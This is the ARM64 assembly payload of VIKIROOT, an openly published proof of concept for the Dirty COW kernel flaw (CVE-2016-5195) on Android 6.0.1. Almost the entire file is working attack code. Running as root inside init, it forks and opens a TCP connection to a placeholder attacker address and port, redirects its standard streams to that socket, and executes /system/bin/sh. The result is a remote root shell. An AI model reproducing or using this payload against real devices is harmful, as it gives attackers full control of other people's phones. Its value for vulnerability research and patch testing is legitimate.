/*
 * CVE-2016-5195 POC FOR ANDROID 6.0.1 MARSHMALLOW
 *
 * Heavily inspired by https://github.com/scumjr/dirtycow-vdso
 *
 * This file is part of VIKIROOT, https://github.com/hyln9/VIKIROOT
 *
 * Copyright (C) 2016-2017 Virgil Hou <virgil@zju.edu.cn>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

.equ SYS_OPENAT, 0x38
.equ SYS_SOCKET, 0xc6
.equ SYS_CONNECT, 0xcb
.equ SYS_DUP3, 0x18
.equ SYS_CLONE, 0xdc
.equ SYS_EXECVE, 0xdd
.equ SYS_EXIT, 0x5d
.equ SYS_READLINKAT, 0x4e
.equ SYS_GETUID, 0xae
.equ SYS_GETPID, 0xac

.equ AF_INET, 0x2
.equ O_EXCL, 0x80
.equ O_CREAT, 0x40
.equ S_IRWXU, 0x1c0
.equ SOCK_STREAM, 0x1

.equ STDIN, 0x0
.equ STDOUT, 0x1
.equ STDERR, 0x2
.equ SIGCHLD, 0x11

.equ IP, 0xdeadc0de
.equ PORT, 0x1337

_start:

        ////////////////////////////////////////////////////////////////
        //
        // save registers
        //
        ////////////////////////////////////////////////////////////////

        stp    x0, x1, [sp,#-16]!

        ////////////////////////////////////////////////////////////////
        //
        // target init(0)
        // return if getuid() != 0 or getpid() !=1
        //
        ////////////////////////////////////////////////////////////////

        mov    x8, SYS_GETUID
        svc    0
        cbnz   w0, return
        mov    x8, SYS_GETPID
        svc    0
        cmp    w0, 1
        b.ne   return

        ////////////////////////////////////////////////////////////////
        //
        // return if open("/data/local/tmp/.x", O_CREAT|O_EXCL, ?) fails
        // use "openat" instead since "open" is deprecated
        // intended to detect write permission and avoid conflict
        //
        ////////////////////////////////////////////////////////////////

        mov    w0, 0    // dirfd is ignored
        adr    x1, path
        mov    w2, O_CREAT|O_EXCL
        mov    w3, S_IRWXU
        mov    x8, SYS_OPENAT
        svc    0
        cmn    x0, #1, LSL#12
        b.hi   return

        ////////////////////////////////////////////////////////////////
        //
        // fork is deprecated, replaced with clone
        //
        ////////////////////////////////////////////////////////////////

        mov    x0, SIGCHLD
        mov    x1, 0
        mov    x2, 0
        mov    x3, 0
        mov    x4, 0
        mov    x8, SYS_CLONE
        svc    0
        cbnz   w0, return

        ////////////////////////////////////////////////////////////////
        //
        // reverse connect
        //
        ////////////////////////////////////////////////////////////////

        // sockfd = socket(AF_INET, SOCK_STREAM, 0)
        mov    x0, AF_INET
        mov    x1, SOCK_STREAM
        mov    x2, 0
        mov    x8, SYS_SOCKET
        svc    0
        mov    x3, x0

        // connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
        adr    x1, sockaddr
        mov    x2, 0x10
        mov    x8, SYS_CONNECT
        svc    0
        cbnz   w0, exit

        // dup3(sockfd, STDIN, 0) ...
        mov    x0, x3
        mov    x2, 0
        mov    x1, STDIN
        mov    x8, SYS_DUP3
        svc    0
        mov    x1, STDOUT
        mov    x8, SYS_DUP3
        svc    0
        mov    x1, STDERR
        mov    x8, SYS_DUP3
        svc    0

        // execve('/system/bin/sh', NULL, NULL)
        adr    x0, shell
        mov    x2, 0
        str    x0, [sp, 0]
        str    x2, [sp, 8]
        mov    x1, sp
        mov    x8, SYS_EXECVE
        svc    0

exit:
        mov    x0, 0
        mov    x8, SYS_EXIT
        svc    0

return:
        ldp    x0, x1, [sp],#16
        mov    x17, x30
        mov    x30, x16
        nop
        nop
        br     x17

path:
        .string "/data/local/tmp/.x"

        .balign 4
sockaddr:
        .short AF_INET
        .short PORT
        .word  IP

shell:
        .string "/system/bin/sh"
